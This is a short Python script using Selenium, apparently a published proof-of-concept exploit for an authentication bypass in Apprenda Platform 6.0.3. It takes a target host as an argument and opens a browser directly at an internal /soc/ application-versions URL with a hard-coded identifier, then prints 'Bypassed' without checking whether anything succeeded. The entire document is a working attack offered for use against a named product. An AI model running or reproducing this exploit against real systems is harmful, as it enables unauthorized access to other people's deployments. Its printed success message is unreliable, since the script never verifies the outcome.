from selenium import webdriver
import sys
print("###########################################################")
print('Apprenda Platform Version: 6.0.3 (Authentication Bypass)')
print('# Explored by Emre Selim')
print('# Developed by Emre Selim')
print('# Author Github: https://github.com/THYemre')
print("###########################################################")
print("Bypassing...")

# Used webdriver for select firefox , if you using chrome you can change it.
driver = webdriver.Firefox()
# Url identified.
url = 'https://'+sys.argv[1]+'/soc/Applications/Versions/?vid=4cffcc32-3d96-41c2-8263-1017fc958f9a'
# Opened web page for bypass.
# If you want you can use only /soc/ url.
# url_for_poc2 = 'https://'+sys.argv[1]+'/soc/'
driver.get(url)

print('Bypassed')
print('Exitting')
